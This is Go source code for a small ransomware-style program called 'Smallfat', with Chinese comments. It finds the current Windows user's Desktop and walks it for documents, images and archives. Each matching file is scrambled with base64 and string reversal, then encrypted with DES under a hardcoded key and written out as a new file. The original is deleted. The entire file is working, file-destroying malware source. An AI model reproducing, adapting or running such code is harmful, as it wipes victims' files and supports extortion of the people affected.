package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"strings"
)

var (
	WhiteList = map[string]string{ //加密文件白名单
		//document
		"word_before":  ".doc",
		"word_after":   ".docx",
		"excel_before": ".xls",
		"excel_afte":   ".xlsx",
		"powerpoint":   ".pptx",
		"pdf":          ".pdf",
		"wps_on":       ".dot",
		"wps_two":      ".dotx",
		//images
		"images1": ".jpg",
		"images2": ".jpeg",
		"images3": ".png",
		"images4": ".gif",
		"images5": ".bmp",
		"images6": ".tiff",
		"images7": ".ai",
		"images8": ".cdr",
		"images9": ".eps",
		//compression
		"rar": ".rar",
		"7z":  ".7z",
		"zip": ".zip",
	}
	key = []byte("Smallfat") //密钥
)

func Del_File(fileName string) {
	err := os.Remove(fileName)
	if err != nil {
		return
	}
}

func Write_File(fileName string, DESContent []byte) {
	//写入文件
	content := `https://github.com/RuanLang0777/Smallfat` + "\r\n\r\n" + base64.StdEncoding.EncodeToString(DESContent)
	baseName := path.Base(fileName)           // 获取文件名+后缀
	ext := path.Ext(baseName)                 // 获取后缀
	name := strings.TrimSuffix(baseName, ext) //获取文件名
	err := ioutil.WriteFile(name+"_Smallfat"+ext, []byte(content), 0777)
	Del_File(fileName)
	if err != nil {
		return
	}
}

func Base64(fileName string) []byte {
	//Base64编码->反转->Base64编码
	file_byte, _ := ioutil.ReadFile(fileName)
	encryption := base64.StdEncoding.EncodeToString(file_byte)
	reverses := Reverse(encryption)
	reverses_encryption := base64.StdEncoding.EncodeToString([]byte(reverses))
	return []byte(reverses_encryption)

}

func MyDESEncrypt(origData, key []byte) string {
	//DES加密
	block, _ := des.NewCipher(key)
	origData = PKCS5Padding(origData, block.BlockSize())
	blockMode := cipher.NewCBCEncrypter(block, key)
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return base64.StdEncoding.EncodeToString(crypted)

}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func Reverse(enbase64 string) string {
	//反转
	a := []rune(enbase64)
	for i, j := 0, len(a)-1; i < j; i, j = i+1, j-1 {
		a[i], a[j] = a[j], a[i]
	}
	return string(a)
}
func Get_User() []string {
	//获取用户名
	cmd := exec.Command("whoami")
	out, _ := cmd.CombinedOutput()
	whoami := strings.Split(string(out), "\\")
	return whoami
}

func WalkDir(filepath string) ([]string, error) {
	files, _ := ioutil.ReadDir(filepath) // 遍历目录下的所有文件名称【包括文件夹】
	var allfile []string                 //存放文件路径
	for _, v := range files {
		fullPath := filepath + "\\" + v.Name() // 全路径 + 文件名称
		if v.IsDir() {                         // 如果是目录
			a, _ := WalkDir(fullPath) // 遍历目录下的所有文件
			allfile = append(allfile, a...)
		} else {
			allfile = append(allfile, fullPath) // 如果不是目录，就直接追加到路径下
		}
	}

	return allfile, nil
}

func Smallfat() {
	Users := Get_User()
	paths := `C:\Users\` + Users[1] + `\Desktop`
	desktop := strings.Replace(paths, "\r\n", "", 1)
	files, _ := WalkDir(desktop)
	for _, fileName := range files {
		SuffixName := path.Ext(fileName)
		for _, SuffixVule := range WhiteList {
			if SuffixName == SuffixVule {
				Base64Content := Base64(fileName)
				DESContent := MyDESEncrypt(Base64Content, key)
				Write_File(fileName, []byte(DESContent))
			}
		}
	}
}

func main() {
	Smallfat()
}
